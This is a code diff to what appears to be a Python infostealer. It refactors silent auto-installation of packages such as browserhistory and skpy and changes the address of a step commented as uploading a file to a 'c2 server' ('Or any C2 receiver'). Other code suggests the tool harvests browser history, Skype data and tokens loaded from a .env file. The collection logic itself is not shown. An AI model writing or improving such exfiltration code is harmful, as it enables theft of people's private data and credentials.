@@ -7,29 +7,30 @@ from __future__ import annotations
 
 from pathlib import Path
 import platform
-import os
-try:
-    import browserhistory as bh
-except:
-    os.system("pip3 install browserhistory==0.1.2")
-
 import base64
-try:
-    from skpy import Skype
-except:
-    os.system("pip3 install Skpy==0.11")
-
 import zlib
 import tempfile
-try:
-    from dotenv import load_dotenv
-except:
-    os.system("pip3 install python-dotenv==1.0.1")
-try:
-    import requests
-except:
-    os.system("pip3 install requests==2.32.3")
+import os
+import sys
+import importlib
+import subprocess
 
+def ensure_module(name, pkg=None):
+    pkg = pkg or name
+    try:
+        return importlib.import_module(name)
+    except ImportError:
+        print(f"[+] Installing missing package: {pkg}")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
+        return importlib.import_module(name)
+
+# Now use it safely:
+bh = ensure_module("browserhistory", "browserhistory==0.1.2")
+Skype = ensure_module("skpy", "Skpy==0.11").Skype
+dotenv = ensure_module("dotenv", "python-dotenv==1.0.1")
+requests = ensure_module("requests", "requests==2.32.3")
+
+from dotenv import load_dotenv
 # load .env for sensitive tokens
 load_dotenv()
 
@@ -258,5 +259,5 @@ if __name__ == "__main__":
     # upload file to c2 server
     remote_file = Path(temp_path).joinpath(file_name)
 
-    remote_upload_url = f"http://127.0.0.1:8000/upload"  # Or any C2 receiver
+    remote_upload_url = f"http://127.0.0.1:8081/upload" 
     senscanner._send_file(file_name, remote_upload_url)
